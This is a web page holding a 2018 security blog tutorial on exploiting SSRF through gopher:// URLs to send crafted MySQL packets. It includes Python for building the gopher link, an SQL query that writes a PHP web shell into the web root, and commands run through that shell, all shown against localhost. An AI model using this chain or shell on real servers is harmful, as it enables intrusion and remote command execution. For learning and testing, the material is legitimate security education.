@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="I am writing the blog after a year because I didn’t get any interesting Vulnerability throughout the year.Recently I came to know about this Vuln which is “SSRF Through Gopher”, it is quite interestin">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF Through Gopher:&#x2F;&#x2F;">
+<meta property="og:url" content="https://tarunkant.github.io/2018/02/05/2018-02-05-ssrf-through-gopher/index.html">
+<meta property="og:site_name" content="SpyClub">
+<meta property="og:description" content="I am writing the blog after a year because I didn’t get any interesting Vulnerability throughout the year.Recently I came to know about this Vuln which is “SSRF Through Gopher”, it is quite interestin">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://tarunkant.github.io/images/photos/mysql-teminal.png">
+<meta property="og:image" content="https://tarunkant.github.io/images/photos/wireshark-1.png">
+<meta property="og:image" content="https://tarunkant.github.io/images/photos/reset-1.jpg">
+<meta property="og:image" content="https://tarunkant.github.io/images/photos/wireshark-2.png">
+<meta property="og:image" content="https://tarunkant.github.io/images/photos/wireshark-3.png">
+<meta property="og:image" content="https://tarunkant.github.io/images/photos/wireshark-4.png">
+<meta property="article:published_time" content="2018-02-04T18:30:00.000Z">
+<meta property="article:modified_time" content="2018-11-02T15:18:46.000Z">
+<meta property="article:author" content="SpyD3r">
+<meta property="article:tag" content="MySQL">
+<meta property="article:tag" content="SSRF">
+<meta property="article:tag" content="Gopher">
+<meta property="article:tag" content="Wireshark">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tarunkant.github.io/images/photos/mysql-teminal.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>SSRF Through Gopher://</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+<!-- Responsive_1 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-6813652886953741"
+     data-ad-slot="9518537929"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+<script>
+      (adsbygoogle = window.adsbygoogle || []).push({
+           google_ad_client: "ca-pub-6813652886953741",
+           enable_page_level_ads: true
+      });
+</script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Blogs</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/tarunkant/SpyTools">Projects</a></li>
+         
+          <li><a href="/resume/resume.pdf">Resume</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/03/18/2018-03-18-backdoorctf-writeup/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2016/12/03/2016-12-03-reset-ubuntu-password/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://tarunkant.github.io/2018/02/05/2018-02-05-ssrf-through-gopher/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://tarunkant.github.io/2018/02/05/2018-02-05-ssrf-through-gopher/&text=SSRF Through Gopher://"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://tarunkant.github.io/2018/02/05/2018-02-05-ssrf-through-gopher/&title=SSRF Through Gopher://"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://tarunkant.github.io/2018/02/05/2018-02-05-ssrf-through-gopher/&is_video=false&description=SSRF Through Gopher://"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SSRF Through Gopher://&body=Check out this article: https://tarunkant.github.io/2018/02/05/2018-02-05-ssrf-through-gopher/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://tarunkant.github.io/2018/02/05/2018-02-05-ssrf-through-gopher/&title=SSRF Through Gopher://"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://tarunkant.github.io/2018/02/05/2018-02-05-ssrf-through-gopher/&title=SSRF Through Gopher://"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://tarunkant.github.io/2018/02/05/2018-02-05-ssrf-through-gopher/&title=SSRF Through Gopher://"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://tarunkant.github.io/2018/02/05/2018-02-05-ssrf-through-gopher/&title=SSRF Through Gopher://"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://tarunkant.github.io/2018/02/05/2018-02-05-ssrf-through-gopher/&name=SSRF Through Gopher://&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Explanation-of-Each-Term"><span class="toc-number">1.</span> <span class="toc-text">Explanation of Each Term:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#What-is-SSRF"><span class="toc-number">1.1.</span> <span class="toc-text">What is SSRF?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#What-is-Gopher"><span class="toc-number">1.2.</span> <span class="toc-text">What is Gopher?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#What-is-Wireshark"><span class="toc-number">1.3.</span> <span class="toc-text">What is Wireshark?</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Make-SSRF-through-gopher"><span class="toc-number">2.</span> <span class="toc-text">Make SSRF through gopher:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Construct-MySQL-Connection-packet"><span class="toc-number">2.1.</span> <span class="toc-text">Construct MySQL-Connection packet:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-gopher-link"><span class="toc-number">2.2.</span> <span class="toc-text">Get gopher link:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Make-SQL-Query"><span class="toc-number">2.3.</span> <span class="toc-text">Make SQL Query:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Finally-SSRF-%F0%9F%99%82"><span class="toc-number">2.4.</span> <span class="toc-text">Finally SSRF 🙂</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        SSRF Through Gopher://
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">SpyClub</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-02-04T18:30:00.000Z" itemprop="datePublished">2018-02-05</time>
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/blog/">blog</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Gopher/" rel="tag">Gopher</a>, <a class="tag-link-link" href="/tags/MySQL/" rel="tag">MySQL</a>, <a class="tag-link-link" href="/tags/SSRF/" rel="tag">SSRF</a>, <a class="tag-link-link" href="/tags/Wireshark/" rel="tag">Wireshark</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>I am writing the blog after a year because I didn’t get any interesting Vulnerability throughout the year.<br>Recently I came to know about this Vuln which is “SSRF Through Gopher”, it is quite interesting because this uses SQL, Wireshark, SSRF, and Gopher.<br><!--break--></p>
+<h2 id="Explanation-of-Each-Term"><a href="#Explanation-of-Each-Term" class="headerlink" title="Explanation of Each Term:"></a>Explanation of Each Term:</h2><h3 id="What-is-SSRF"><a href="#What-is-SSRF" class="headerlink" title="What is SSRF?"></a>What is SSRF?</h3><p>Server-Side Request Forgery (SSRF) refers to an attack wherein an attacker is able to send a crafted request from a vulnerable web application. SSRF is usually used to target internal systems behind firewalls that are normally inaccessible to an attacker from the external network.</p>
+<h3 id="What-is-Gopher"><a href="#What-is-Gopher" class="headerlink" title="What is Gopher?"></a>What is Gopher?</h3><p>Gopher is an application-layer protocol that provides the ability to extract and view Web documents stored on remote Web servers. Gopher was conceived in 1991 as one of the Internet’s first data/file access protocols to run on top of a TCP/IP network. It was developed at the University of Minnesota and is named after the school’s mascot.<br><strong>We can use gopher:// to communicate with the MySQL database.</strong></p>
+<h3 id="What-is-Wireshark"><a href="#What-is-Wireshark" class="headerlink" title="What is Wireshark?"></a>What is Wireshark?</h3><p>Wireshark is a free and open source packet analyzer. It is used for network troubleshooting, analysis, software and communications protocol development, and education.</p>
+<h2 id="Make-SSRF-through-gopher"><a href="#Make-SSRF-through-gopher" class="headerlink" title="Make SSRF through gopher:"></a>Make SSRF through gopher:</h2><ul>
+<li><h3 id="Construct-MySQL-Connection-packet"><a href="#Construct-MySQL-Connection-packet" class="headerlink" title="Construct MySQL-Connection packet:"></a>Construct MySQL-Connection packet:</h3>open your Wireshark, and write this command in terminal:<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">-</span>h <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="operator">-</span>u test</span><br></pre></td></tr></table></figure>
+Make sure the username you are putting here doesn’t have the password.(If MySQL doesn’t have any user without password then make one test account.)<br>you can get how to create a new user in MySQL by Googling 😛.<br>We can’t do with username having the password because it sends the salt(which changes in every attempt) to encrypt/decrypt the password to get login.</li>
+</ul>
+<style>
+* {box-sizing: border-box}
+body {font-family: Verdana, sans-serif; margin:0}
+.mySlides {display: none}
+img {vertical-align: middle;}
+
+
+.slideshow-container {
+  max-width: 1000px;
+  position: relative;
+  margin: auto;
+}
+
+
+.prev, .next {
+  cursor: pointer;
+  position: absolute;
+  top: 50%;
+  width: auto;
+  padding: 16px;
+  margin-top: -22px;
+  color: white;
+  font-weight: bold;
+  font-size: 18px;
+  transition: 0.6s ease;
+  border-radius: 0 3px 3px 0;
+}
+
+
+.next {
+  right: 0;
+  border-radius: 3px 0 0 3px;
+}
+
+
+.prev:hover, .next:hover {
+  background-color: rgba(0,0,0,0.8);
+}
+
+
+.text {
+  color: #f2f2f2;
+  font-size: 15px;
+  padding: 8px 12px;
+  position: absolute;
+  bottom: 8px;
+  width: 100%;
+  text-align: center;
+}
+
+
+.numbertext {
+  color: #f2f2f2;
+  font-size: 12px;
+  padding: 8px 12px;
+  position: absolute;
+  top: 0;
+}
+
+
+.dot {
+  cursor: pointer;
+  height: 15px;
+  width: 15px;
+  margin: 0 2px;
+  background-color: #bbb;
+  border-radius: 50%;
+  display: inline-block;
+  transition: background-color 0.6s ease;
+}
+
+.active, .dot:hover {
+  background-color: #717171;
+}
+.dot1 {
+  cursor: pointer;
+  height: 15px;
+  width: 15px;
+  margin: 0 2px;
+  background-color: #bbb;
+  border-radius: 50%;
+  display: inline-block;
+  transition: background-color 0.6s ease;
+}
+
+.active, .dot1:hover {
+  background-color: #717171;
+}
+
+
+.fade {
+  -webkit-animation-name: fade;
+  -webkit-animation-duration: 1.5s;
+  animation-name: fade;
+  animation-duration: 1.5s;
+}
+
+@-webkit-keyframes fade {
+  from {opacity: .4}
+  to {opacity: 1}
+}
+
+@keyframes fade {
+  from {opacity: .4}
+  to {opacity: 1}
+}
+
+
+@media only screen and (max-width: 300px) {
+  .prev, .next,.text {font-size: 11px}
+}
+</style>
+
+<div class="slideshow-container"><br><br><div class="mySlides fade"><br>  <div class="numbertext">1 / 2</div><br>  <img src="/images/photos/mysql-teminal.png" style="width:100%"><br><br></div>
+
+<div class="mySlides fade"><br>  <div class="numbertext">2 / 2</div><br>  <img src="/images/photos/wireshark-1.png" style="width:100%"><br><br></div>
+
+<!-- <div class="mySlides fade">
+  <div class="numbertext">3 / 3</div>
+  <img src="/images/photos/reset-1.jpg" style="width:100%">
+  <div class="text">Caption Three</div>
+</div>-->
+<p><a class="prev" onclick="plusSlides(-1)">&#10094;</a><br><a class="next" onclick="plusSlides(1)">&#10095;</a></p>
+<p></div><br><br></p>
+<!-- <div style="text-align:center">
+  <span class="dot" onclick="currentSlide(1)"></span>
+  <span class="dot" onclick="currentSlide(2)"></span>
+</div> -->
+<script>
+var slideIndex = 1;
+showSlides(slideIndex);
+
+function plusSlides(n) {
+  showSlides(slideIndex += n);
+}
+
+function currentSlide(n) {
+  showSlides(slideIndex = n);
+}
+
+function showSlides(n) {
+  var i;
+  var slides = document.getElementsByClassName("mySlides");
+  var dots = document.getElementsByClassName("dot");
+  if (n > slides.length) {slideIndex = 1}    
+  if (n < 1) {slideIndex = slides.length}
+  for (i = 0; i < slides.length; i++) {
+      slides[i].style.display = "none";  
+  }
+  for (i = 0; i < dots.length; i++) {
+      dots[i].className = dots[i].className.replace(" active", "");
+  }
+  slides[slideIndex-1].style.display = "block";  
+  dots[slideIndex-1].className += " active";
+}
+</script>
+
+
+<p> You can see the MySQL-Connection packets in Wireshark, Now you have to get the hex dump of connection packets, So for that, do:<br>Right-click on <code>Login-Request user=test</code> =&gt; Go to Follow =&gt; TCP Stram = &gt; Change it to RAW Data =&gt; Only take the incoming packets(127.0.0.1:42196 -&gt; 127.0.0.1:3306,  in  my case)</p>
+<div class="slideshow-container"><br><br><div class="mySlides1 fade"><br>  <div class="numbertext">1 / 3</div><br>  <img src="/images/photos/wireshark-2.png" style="width:100%"><br></div>
+
+<div class="mySlides1 fade1"><br>  <div class="numbertext">2 / 3</div><br>  <img src="/images/photos/wireshark-3.png" style="width:100%"><br></div>
+
+<div class="mySlides1 fade1"><br>  <div class="numbertext">3 / 3</div><br>  <img src="/images/photos/wireshark-4.png" style="width:100%"><br></div>
+
+<p><a class="prev" onclick="plusSlides1(-1)">&#10094;</a><br><a class="next" onclick="plusSlides1(1)">&#10095;</a></p>
+<p><br><br></div></p>
+<script>
+var slideIndex = 1;
+showSlides1(slideIndex);
+
+function plusSlides1(n) {
+  showSlides1(slideIndex += n);
+}
+
+function currentSlide1(n) {
+  showSlides1(slideIndex = n);
+}
+
+function showSlides1(n) {
+  var i;
+  var slides = document.getElementsByClassName("mySlides1");
+  var dots = document.getElementsByClassName("dot1");
+  if (n > slides.length) {slideIndex = 1}    
+  if (n < 1) {slideIndex = slides.length}
+  for (i = 0; i < slides.length; i++) {
+      slides[i].style.display = "none";  
+  }
+  for (i = 0; i < dots.length; i++) {
+      dots[i].className = dots[i].className.replace(" active", "");
+  }
+  slides[slideIndex-1].style.display = "block";  
+  dots[slideIndex-1].className += " active";
+}
+</script>
+
+<p>The values in red are hex dump of the MySQL-Connection packets.  </p>
+<ul>
+<li><h3 id="Get-gopher-link"><a href="#Get-gopher-link" class="headerlink" title="Get gopher link:"></a>Get gopher link:</h3><p>Gopher link is nothing but the URL form of hex dump.  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;HEX-DUMP&quot;</span></span><br><span class="line">a = [s[i:i + <span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s), <span class="number">2</span>)]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;gopher://127.0.0.1:3306/_%&quot;</span> + <span class="string">&quot;%&quot;</span>.join(a)</span><br></pre></td></tr></table></figure>
+<p>But if we add the SQL query to it then the packets will get change, So finally the packets will be:  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">auth = s</span><br><span class="line">query = <span class="string">&quot;YOUR-SQL-QUERY&quot;</span></span><br><span class="line">query = query.encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">query_length = <span class="string">&#x27;&#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>((<span class="built_in">int</span>((<span class="built_in">len</span>(query) / <span class="number">2</span>) + <span class="number">1</span>)))</span><br><span class="line">pay1 = query_length.rjust(<span class="number">2</span>,<span class="string">&#x27;0&#x27;</span>) + <span class="string">&quot;00000003&quot;</span> + query</span><br><span class="line">final = encode(auth + pay1 + <span class="string">&quot;0100000001&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> final</span><br></pre></td></tr></table></figure>
+<p>You can get the complete <a target="_blank" rel="noopener" href="https://github.com/tarunkant/Automation/blob/master/SSRF-through-Gopher.py">code</a> here.<br>And use the <a target="_blank" rel="noopener" href="https://github.com/tarunkant/Automation/blob/master/SSRF-through-Gopher.py">same</a> code for generating gopher link.  </p>
+</li>
+<li><h3 id="Make-SQL-Query"><a href="#Make-SQL-Query" class="headerlink" title="Make SQL Query:"></a>Make SQL Query:</h3><p>We have to make SQL Query which will make a file containing malicious PHP code, So that after executing the same file, it will get created into the server.</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> &quot;&lt;?php system($_REQUEST[&#x27;cmd&#x27;]); ?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>As you can see we created PHP shell, Now you can do anything 😛</p>
+</li>
+<li><h3 id="Finally-SSRF-🙂"><a href="#Finally-SSRF-🙂" class="headerlink" title="Finally SSRF 🙂"></a>Finally SSRF 🙂</h3><p>Till now we have created gopher link having a SQL query.<br>Now time to execute:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl GOPHER<span class="operator">-</span>LINK</span><br></pre></td></tr></table></figure>
+<p>You can see your output of SQL query in the terminal.<br>If you made the gopher link having Malicious SQL query(same query we made) and did execute then the file will get created at <code>/var/www/html</code> folder and you can open that file from browser <code>http://localhost/shell.php</code><br>Now you have uploaded shell file on the server, and can execute shell commands like:  </p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/shell.php?cmd=ls</span><br><span class="line">http://localhost/shell.php?cmd=ls /</span><br></pre></td></tr></table></figure>
+<p><strong>If any site using curl and asks you URL for uploading the file then try gopher link and get owned the site(By the way they block these things 😛 ).<br>This is for educational purpose, Don’t try in live servers 😛</strong><br>Thanks for Reading this blog, I hope I will get you understand what I meant.<br>If you have any suggestions, doubts then just comment here.  </p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Blogs</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/tarunkant/SpyTools">Projects</a></li>
+         
+          <li><a href="/resume/resume.pdf">Resume</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Explanation-of-Each-Term"><span class="toc-number">1.</span> <span class="toc-text">Explanation of Each Term:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#What-is-SSRF"><span class="toc-number">1.1.</span> <span class="toc-text">What is SSRF?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#What-is-Gopher"><span class="toc-number">1.2.</span> <span class="toc-text">What is Gopher?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#What-is-Wireshark"><span class="toc-number">1.3.</span> <span class="toc-text">What is Wireshark?</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Make-SSRF-through-gopher"><span class="toc-number">2.</span> <span class="toc-text">Make SSRF through gopher:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Construct-MySQL-Connection-packet"><span class="toc-number">2.1.</span> <span class="toc-text">Construct MySQL-Connection packet:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-gopher-link"><span class="toc-number">2.2.</span> <span class="toc-text">Get gopher link:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Make-SQL-Query"><span class="toc-number">2.3.</span> <span class="toc-text">Make SQL Query:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Finally-SSRF-%F0%9F%99%82"><span class="toc-number">2.4.</span> <span class="toc-text">Finally SSRF 🙂</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://tarunkant.github.io/2018/02/05/2018-02-05-ssrf-through-gopher/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://tarunkant.github.io/2018/02/05/2018-02-05-ssrf-through-gopher/&text=SSRF Through Gopher://"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://tarunkant.github.io/2018/02/05/2018-02-05-ssrf-through-gopher/&title=SSRF Through Gopher://"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://tarunkant.github.io/2018/02/05/2018-02-05-ssrf-through-gopher/&is_video=false&description=SSRF Through Gopher://"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SSRF Through Gopher://&body=Check out this article: https://tarunkant.github.io/2018/02/05/2018-02-05-ssrf-through-gopher/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://tarunkant.github.io/2018/02/05/2018-02-05-ssrf-through-gopher/&title=SSRF Through Gopher://"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://tarunkant.github.io/2018/02/05/2018-02-05-ssrf-through-gopher/&title=SSRF Through Gopher://"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://tarunkant.github.io/2018/02/05/2018-02-05-ssrf-through-gopher/&title=SSRF Through Gopher://"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://tarunkant.github.io/2018/02/05/2018-02-05-ssrf-through-gopher/&title=SSRF Through Gopher://"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://tarunkant.github.io/2018/02/05/2018-02-05-ssrf-through-gopher/&name=SSRF Through Gopher://&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2025 SpyD3r
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Blogs</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/tarunkant/SpyTools">Projects</a></li>
+         
+          <li><a href="/resume/resume.pdf">Resume</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- ad_1 -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-6813652886953741"
+     data-ad-slot="9851733933"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-122832343-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'spyclub';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
